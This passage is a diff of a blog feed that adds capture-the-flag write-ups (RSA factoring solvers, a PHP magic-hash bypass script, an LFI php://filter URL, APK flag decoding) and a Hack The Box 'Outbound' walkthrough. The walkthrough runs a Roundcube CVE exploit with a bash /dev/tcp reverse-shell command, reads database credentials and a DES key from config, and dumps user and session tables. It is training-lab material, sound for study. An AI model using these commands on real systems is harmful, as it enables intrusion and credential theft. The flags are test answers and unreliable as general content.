Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)&lt;/p&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>and here is it the flag</li>
+</ol>
+<h2 id="Neighbour-RSA-2"><a href="#Neighbour-RSA-2" class="headerlink" title="Neighbour RSA_2"></a>Neighbour RSA_2</h2><ol>
+<li>Here is the original code provided<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import prev_prime as next_prime</span><br><span class="line">import secrets</span><br><span class="line"></span><br><span class="line">flag = b&quot;EQCTF&#123;&lt;REDACTED&gt;&#125;&quot;</span><br><span class="line">a = bytes_to_long(secrets.token_bytes(100))</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = next_prime(a+p)</span><br><span class="line"></span><br><span class="line">N = int(p*q)</span><br><span class="line">e = 65537</span><br><span class="line">f = int(q+a-p)</span><br><span class="line"></span><br><span class="line">C = pow(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line">print(f&quot;&#123;N=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;e=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;C=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;f=&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># N=10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line"># e=65537</span><br><span class="line"># C=2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line"># f=4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br></pre></td></tr></table></figure></div></li>
+<li>Decrypt it<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">from gmpy2 import isqrt</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line">e = 65537</span><br><span class="line">C = 2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line">f = 4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br><span class="line"></span><br><span class="line"># Approximate a</span><br><span class="line">a_approx = f // 2</span><br><span class="line"></span><br><span class="line"># Define a small range around a_approx</span><br><span class="line">range_size = 1000  # Adjust this range as needed</span><br><span class="line"></span><br><span class="line"># Iterate over the range</span><br><span class="line">for delta in range(-range_size, range_size + 1):</span><br><span class="line">    a = a_approx + delta</span><br><span class="line"></span><br><span class="line">    # Solve the quadratic equation: p^2 + (f - a) * p - N = 0</span><br><span class="line">    A = 1</span><br><span class="line">    B = f - a</span><br><span class="line">    C_eq = -N</span><br><span class="line"></span><br><span class="line">    # Discriminant</span><br><span class="line">    discriminant = B**2 - 4 * A * C_eq</span><br><span class="line"></span><br><span class="line">    # Check if discriminant is a perfect square</span><br><span class="line">    if discriminant &gt;= 0:</span><br><span class="line">        sqrt_discriminant = isqrt(discriminant)</span><br><span class="line">        if sqrt_discriminant * sqrt_discriminant == discriminant:</span><br><span class="line">            # Solve for p</span><br><span class="line">            p_candidate = (-B + sqrt_discriminant) // (2 * A)</span><br><span class="line"></span><br><span class="line">            # Check if p_candidate is a factor of N</span><br><span class="line">            if N % p_candidate == 0:</span><br><span class="line">                p = p_candidate</span><br><span class="line">                q = N // p</span><br><span class="line">                print(f&quot;Found p and q:&quot;)</span><br><span class="line">                print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">                print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line">                # Compute phi(N)</span><br><span class="line">                phi = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">                # Compute the private key d</span><br><span class="line">                d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">                # Decrypt the ciphertext</span><br><span class="line">                plaintext = pow(C, d, N)</span><br><span class="line"></span><br><span class="line">                # Convert the plaintext to bytes</span><br><span class="line">                flag = long_to_bytes(plaintext)</span><br><span class="line">                print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Failed to factorize N.&quot;)</span><br></pre></td></tr></table></figure></div></li>
+<li>Anddd there you go the flag</li>
+</ol>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EggSecret"><a href="#EggSecret" class="headerlink" title="EggSecret"></a>EggSecret</h2><ol>
+<li><p>First download the file attached and lets see whats inside.</p>
+</li>
+<li><p>We can see that there is a secret hash at there <code>00e39786989574093743872279278460</code> also there is something we need to bypass <code>(preg_match(&quot;/^(.*?)+$/s&quot;, $egg))</code></p>
+</li>
+<li><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://135.181.88.229:31730/&quot;</span><br><span class="line">params = &#123;&quot;eggSecret&quot;: &quot;240610708&quot;&#125;  # String with MD5 hash starting with &quot;0e&quot;</span><br><span class="line">data = &#123;&quot;egg&quot;: &quot;A&quot; * 10000&#125;  # Very large input to bypass the regex</span><br><span class="line">response = requests.post(url, params=params, data=data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>and we can get the flag content.</p>
+</li>
+</ol>
+<h2 id="KingsBrew"><a href="#KingsBrew" class="headerlink" title="KingsBrew"></a>KingsBrew</h2><ol>
+<li>First we get into the website using the host and port given.</li>
+<li>According to the hint it should be something menu as when you press {drink and flag!} it jump out menu.php.</li>
+<li>After we test, LFI is usable in this case</li>
+<li><code>http://135.181.88.229:35206/?page=php://filter/convert.base64-encode/resource=menu.php</code></li>
+<li>This is one of LFI payloads of PHP filters to read menu.php without executing PHP and decode the base 64 by ourself using cyberchef.</li>
+</ol>
+<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Who’s-that-pukimon"><a href="#Who’s-that-pukimon" class="headerlink" title="Who’s that pukimon"></a>Who’s that pukimon</h2><ol>
+<li>Download the APK Andorid files and open it in a android emulator(Im using andorid studio)</li>
+<li>We can see that this is a game that we need to guess who is this Pokemon (pukimon)<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/22.png"
+                      alt="gueessss"
+                ></li>
+<li>With the use of jadx-gui</li>
+<li>We can see that the main activity files is mainactivity<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/11.png"
+                      alt="main"
+                ></li>
+<li>Find it out at (source&#x2F;io.eqctf.pukimon&#x2F;MainActivitykt) </li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/33.png"
+                      alt="hey"
+                ><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    /* JADX INFO: Access modifiers changed from: private */</span><br><span class="line">    public static final Unit a$lambda$11$lambda$10(Context yeet, MutableState a$delegate) &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(yeet, &quot;$yeet&quot;);</span><br><span class="line">        Intrinsics.checkNotNullParameter(a$delegate, &quot;$a$delegate&quot;);</span><br><span class="line">        if (a(a$lambda$6(a$delegate))) &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">            byte[] decode = Base64.decode(&quot;AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9&quot;, 0);</span><br><span class="line">            Intrinsics.checkNotNullExpressionValue(decode, &quot;decode(...)&quot;);</span><br><span class="line">            Log.d(&quot;Flag&quot;, &quot;Congratz on guessing the pokemon: &quot;.concat(new String(decode, Charsets.UTF_8)));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s not &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">        &#125;</span><br><span class="line">        return Unit.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
+<li>Decode <code>AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9</code> with cyberchef and we can get the flag EQCTF{1Ts_Shr0oMr1sHiE!!!!}</li>
+</ol>
+<h2 id="Capture-that-Pukimon"><a href="#Capture-that-Pukimon" class="headerlink" title="Capture that Pukimon"></a>Capture that Pukimon</h2><ol>
+<li>With the use of http toolkit, we can intercept the data from the firebase<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/shrommie.png"
+                      alt="shrommie"
+                ></li>
+<li>And thats the flag EQCTF{Int3RcEpT_da_Tr3FfiC}”</li>
+</ol>
 ]]></content>
+      <categories>
+        <category>CTF 2025</category>
+      </categories>
       <tags>
-        <tag>CTF 2025</tag>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1488,8 +1448,297 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Outbound</title>
+    <url>/2025/10/03/HTB-Outbound/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../image/HTB/Outbound/OUTBOUND.png"
+                      alt="OUTBOUND"
+                ></p>
+<h1 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h1><p>This is a Hack The Box machine writeup for Outbound. In this machine, I used nmap to discover details about the target IP address, identified a CVE affecting the Roundcube webmail application, extracted encrypted passwords from the database, decrypted them, and gained SSH access to retrieve the flags.</p>
+<h2 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h2><h3 id="Nmap-Scanning"><a href="#Nmap-Scanning" class="headerlink" title="Nmap Scanning"></a>Nmap Scanning</h3><p>I was given an IP address: 10.10.11.77.</p>
+<p>I ran nmap to scan for all information on this IP address:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn 10.10.11.77</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Command Breakdown:</strong></p>
+<ul>
+<li><code>-sC</code>: Runs default NSE (Nmap Scripting Engine) scripts. These scripts perform common vulnerability checks, service enumeration, and gather additional information about detected services.</li>
+<li><code>-sV</code>: Enables version detection. Probes open ports to determine service&#x2F;version info (what software is running and its version).</li>
+<li><code>-Pn</code>: Treats all hosts as online, skipping host discovery. This bypasses ping probes and assumes the target is up, useful when ICMP is blocked.</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(global_venv)─(w_11㉿kali)-[~]</span><br><span class="line">└─$ nmap -sC -sV -Pn 10.10.11.77</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 02:10 +08</span><br><span class="line">Nmap scan report for 10.10.11.77</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)</span><br><span class="line">|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.24.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.24.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://mail.outbound.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.97 seconds</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Adding-Hosts-Entry"><a href="#Adding-Hosts-Entry" class="headerlink" title="Adding Hosts Entry"></a>Adding Hosts Entry</h3><p>We discovered that the web server redirects to <code>http://mail.outbound.htb/</code></p>
+<p>Then, I added this to the hosts file so that our system knows to connect to 10.10.11.77 when we visit mail.outbound.htb in the browser:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sh -c <span class="string">&#x27;echo &quot;10.10.11.77 mail.outbound.htb outbound.htb&quot; &gt;&gt; /etc/hosts&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Identifying-Roundcube-Webmail"><a href="#Identifying-Roundcube-Webmail" class="headerlink" title="Identifying Roundcube Webmail"></a>Identifying Roundcube Webmail</h3><p>After visiting the website and signing in using the user credentials provided, we can see the webmail interface. </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../image/HTB/Outbound/image.png"
+                      alt="UI"
+                ></p>
+<p>I inspected all the functions in the webmail and found that the version of this webmail is shown in the “About” section.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../image/HTB/Outbound/about.png"
+                      alt="About"
+                ></p>
+<h3 id="Finding-CVE-2025-49113"><a href="#Finding-CVE-2025-49113" class="headerlink" title="Finding CVE-2025-49113"></a>Finding CVE-2025-49113</h3><h3 id="Finding-CVE-2025-49113-1"><a href="#Finding-CVE-2025-49113-1" class="headerlink" title="Finding CVE-2025-49113"></a>Finding CVE-2025-49113</h3><p>I performed a Google search for CVEs or vulnerabilities for this version and found something interesting:</p>
+<ul>
+<li><strong>CVE:</strong> <a class="link"   href="https://www.offsec.com/blog/cve-2025-49113/" >https://www.offsec.com/blog/cve-2025-49113/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p>According to the website, “Affected Versions: All versions prior to 1.5.10, 1.6.11” — which means our Roundcube Webmail 1.6.10 is an affected version.</p>
+<h3 id="Exploiting-the-Vulnerability"><a href="#Exploiting-the-Vulnerability" class="headerlink" title="Exploiting the Vulnerability"></a>Exploiting the Vulnerability</h3><p>After reading through the report blog, I found an exploit script at <a class="link"   href="https://github.com/fearsoff-org/CVE-2025-49113" >https://github.com/fearsoff-org/CVE-2025-49113<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> which can help exploit the webmail before the patched version.</p>
+<p>I cloned the repo and prepared to run the exploit script.</p>
+<p><strong>Before running the script, set up a netcat listener:</strong></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 4444</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Then run the exploit:</strong></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.240/4444 0&gt;&amp;1&quot;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Gaining-Initial-Access"><a href="#Gaining-Initial-Access" class="headerlink" title="Gaining Initial Access"></a>Gaining Initial Access</h3><p>We successfully gained access to the server:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(global_venv)─(w_11㉿kali)-[~]</span><br><span class="line">└─$ nc -nlvp 4444                </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.240] from (UNKNOWN) [10.10.11.77] 37810</span><br><span class="line">bash: cannot set terminal process group (257): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@mail:/var/www/html/roundcube/public_html$ ls</span><br><span class="line">ls</span><br><span class="line">index.php</span><br><span class="line">plugins</span><br><span class="line">program</span><br><span class="line">roundcube</span><br><span class="line">skins</span><br><span class="line">www-data@mail:/var/www/html/roundcube/public_html$ cat index.php</span><br><span class="line">cat index.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> +-----------------------------------------------------------------------+</span><br><span class="line"> | Roundcube Webmail IMAP Client                                         |</span><br><span class="line"> | Version 1.6.10                                                       |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | Copyright (C) The Roundcube Dev Team                                  |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | Licensed under the GNU General Public License version 3 or            |</span><br><span class="line"> | any later version with exceptions for skins &amp; plugins.                |</span><br><span class="line"> | See the README file for a full license statement.                     |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | PURPOSE:                                                              |</span><br><span class="line"> |   This is the public entry point for all HTTP requests to the         |</span><br><span class="line"> |   Roundcube webmail application.                                      |</span><br><span class="line"> +-----------------------------------------------------------------------+</span><br><span class="line"> | Author: Thomas Bruederli &lt;roundcube@gmail.com&gt;                        |</span><br><span class="line"> | Author: Aleksander Machniak &lt;alec@alec.pl&gt;                            |</span><br><span class="line"> +-----------------------------------------------------------------------+</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">define(&#x27;INSTALL_PATH&#x27;, realpath(__DIR__ . &#x27;/..&#x27;) . &#x27;/&#x27;);</span><br><span class="line"></span><br><span class="line">// include index.php from application root directory</span><br><span class="line">include INSTALL_PATH . &#x27;index.php&#x27;;</span><br><span class="line">www-data@mail:/var/www/html/roundcube/public_html$</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Exploring-the-File-System"><a href="#Exploring-the-File-System" class="headerlink" title="Exploring the File System"></a>Exploring the File System</h3><p>We can see that there are several files inside. Let me navigate to the configuration directory:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@mail:/var/www/html/roundcube/public_html$ ls</span><br><span class="line">index.php</span><br><span class="line">plugins</span><br><span class="line">program</span><br><span class="line">roundcube</span><br><span class="line">skins</span><br><span class="line">www-data@mail:/var/www/html/roundcube/public_html$ cd roundcube</span><br><span class="line"></span><br><span class="line">www-data@mail:/var/www/html/roundcube/public_html/roundcube$ ls</span><br><span class="line">CHANGELOG.md</span><br><span class="line">INSTALL</span><br><span class="line">LICENSE</span><br><span class="line">README.md</span><br><span class="line">SECURITY.md</span><br><span class="line">SQL</span><br><span class="line">UPGRADING</span><br><span class="line">bin</span><br><span class="line">composer.json</span><br><span class="line">composer.lock</span><br><span class="line">config</span><br><span class="line">index.php</span><br><span class="line">logs</span><br><span class="line">plugins</span><br><span class="line">program</span><br><span class="line">public_html</span><br><span class="line">skins</span><br><span class="line">temp</span><br><span class="line">vendor</span><br><span class="line">www-data@mail:/var/www/html/roundcube/public_html/roundcube$ cd config/</span><br><span class="line"></span><br><span class="line">www-data@mail:/var/www/html/roundcube/public_html/roundcube/config$ ls</span><br><span class="line">config.inc.php</span><br><span class="line">config.inc.php.sample</span><br><span class="line">defaults.inc.php</span><br><span class="line">mimetypes.php</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Finding-Configuration-Files"><a href="#Finding-Configuration-Files" class="headerlink" title="Finding Configuration Files"></a>Finding Configuration Files</h3><p>I opened config.inc.php to look for sensitive information:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@mail:/var/www/html/roundcube/public_html/roundcube/config$ cat con</span><br><span class="line">&lt;be/public_html/roundcube/config$ cat config.inc.php                       </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> +-----------------------------------------------------------------------+</span><br><span class="line"> | Local configuration for the Roundcube Webmail installation.           |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | This is a sample configuration file only containing the minimum       |</span><br><span class="line"> | setup required for a functional installation. Copy more options       |</span><br><span class="line"> | from defaults.inc.php to this file to override the defaults.          |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | This file is part of the Roundcube Webmail client                     |</span><br><span class="line"> | Copyright (C) The Roundcube Dev Team                                  |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | Licensed under the GNU General Public License version 3 or            |</span><br><span class="line"> | any later version with exceptions for skins &amp; plugins.                |</span><br><span class="line"> | See the README file for a full license statement.                     |</span><br><span class="line"> +-----------------------------------------------------------------------+</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">$config = [];</span><br><span class="line"></span><br><span class="line">// Database connection string (DSN) for read+write operations</span><br><span class="line">// Format (compatible with PEAR MDB2): db_provider://user:password@host/database</span><br><span class="line">// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle</span><br><span class="line">// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php</span><br><span class="line">// NOTE: for SQLite use absolute path (Linux): &#x27;sqlite:////full/path/to/sqlite.db?mode=0646&#x27;</span><br><span class="line">//       or (Windows): &#x27;sqlite:///C:/full/path/to/sqlite.db&#x27;</span><br><span class="line">$config[&#x27;db_dsnw&#x27;] = &#x27;mysql://roundcube:RCDBPass2025@localhost/roundcube&#x27;;</span><br><span class="line"></span><br><span class="line">// IMAP host chosen to perform the log-in.</span><br><span class="line">// See defaults.inc.php for the option description.</span><br><span class="line">$config[&#x27;imap_host&#x27;] = &#x27;localhost:143&#x27;;</span><br><span class="line"></span><br><span class="line">// SMTP server host (for sending mails).</span><br><span class="line">// See defaults.inc.php for the option description.</span><br><span class="line">$config[&#x27;smtp_host&#x27;] = &#x27;localhost:587&#x27;;</span><br><span class="line"></span><br><span class="line">// SMTP username (if required) if you use %u as the username Roundcube</span><br><span class="line">// will use the current username for login</span><br><span class="line">$config[&#x27;smtp_user&#x27;] = &#x27;%u&#x27;;</span><br><span class="line"></span><br><span class="line">// SMTP password (if required) if you use %p as the password Roundcube</span><br><span class="line">// will use the current user&#x27;s password for login</span><br><span class="line">$config[&#x27;smtp_pass&#x27;] = &#x27;%p&#x27;;</span><br><span class="line"></span><br><span class="line">// provide an URL where a user can get support for this Roundcube installation</span><br><span class="line">// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!</span><br><span class="line">$config[&#x27;support_url&#x27;] = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">// Name your service. This is displayed on the login screen and in the window title</span><br><span class="line">$config[&#x27;product_name&#x27;] = &#x27;Roundcube Webmail&#x27;;</span><br><span class="line"></span><br><span class="line">// This key is used to encrypt the users imap password which is stored</span><br><span class="line">// in the session record. For the default cipher method it must be</span><br><span class="line">// exactly 24 characters long.</span><br><span class="line">// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS</span><br><span class="line">$config[&#x27;des_key&#x27;] = &#x27;rcmail-!24ByteDESkey*Str&#x27;;</span><br><span class="line"></span><br><span class="line">// List of active plugins (in plugins/ directory)</span><br><span class="line">$config[&#x27;plugins&#x27;] = [</span><br><span class="line">    &#x27;archive&#x27;,</span><br><span class="line">    &#x27;zipdownload&#x27;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">// skin name: folder from skins/</span><br><span class="line">$config[&#x27;skin&#x27;] = &#x27;elastic&#x27;;</span><br><span class="line">$config[&#x27;default_host&#x27;] = &#x27;localhost&#x27;;</span><br><span class="line">$config[&#x27;smtp_server&#x27;] = &#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Key findings:</strong></p>
+<ul>
+<li>Database credentials: <code>mysql://roundcube:RCDBPass2025@localhost/roundcube</code></li>
+<li>DES encryption key: <code>rcmail-!24ByteDESkey*Str</code> (This is used to encrypt passwords!)</li>
+</ul>
+<h3 id="Accessing-the-MySQL-Database"><a href="#Accessing-the-MySQL-Database" class="headerlink" title="Accessing the MySQL Database"></a>Accessing the MySQL Database</h3><p>In the configuration, I also found database connection details:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$config[&#x27;db_dsnw&#x27;] = &#x27;mysql://roundcube:@localhost/roundcubemail&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p>This indicates that there is a MySQL database available. Let’s access it:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u roundcube -pRCDBPass2025 roundcube</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Extracting-User-Data"><a href="#Extracting-User-Data" class="headerlink" title="Extracting User Data"></a>Extracting User Data</h3><p>Once connected to the database, I queried for user information:</p>
+<h3 id="Extracting-User-Data-1"><a href="#Extracting-User-Data-1" class="headerlink" title="Extracting User Data"></a>Extracting User Data</h3><p>Once connected to the database, I queried for user information:</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">USE roundcube;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> session;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>User table results:</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_id username        mail_host       created last_login      failed_login    failed_login_counter    language        preferences</span><br><span class="line">1       jacob   localhost       2025-06-07 13:55:18     2025-06-11 07:52:49     2025-06-11 07:51:32     1       en_US   a:1:&#123;s:11:&quot;client_hash&quot;;s:16:&quot;hpLLqLwmqbyihpi7&quot;;&#125;</span><br><span class="line">2       mel     localhost       2025-06-08 12:04:51     2025-06-08 13:29:05     NULL    NULL    en_US   a:1:&#123;s:11:&quot;client_hash&quot;;s:16:&quot;GCrPGMkZvbsnc3xv&quot;;&#125;</span><br><span class="line">3       tyler   localhost       2025-06-08 13:28:55     2025-10-02 19:12:19     2025-06-11 07:51:22     1       en_US   a:2:&#123;s:11:&quot;client_hash&quot;;s:16:&quot;AB3l7IenOCdOe3Q8&quot;;i:0;b:0;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Here we discovered that <strong>jacob</strong> is a user with an early login date of 2025-06-07. Let’s investigate his session data.</p>
+<h3 id="Finding-Encrypted-Password"><a href="#Finding-Encrypted-Password" class="headerlink" title="Finding Encrypted Password"></a>Finding Encrypted Password</h3><p>I found jacob’s session data containing an encrypted password:</p>
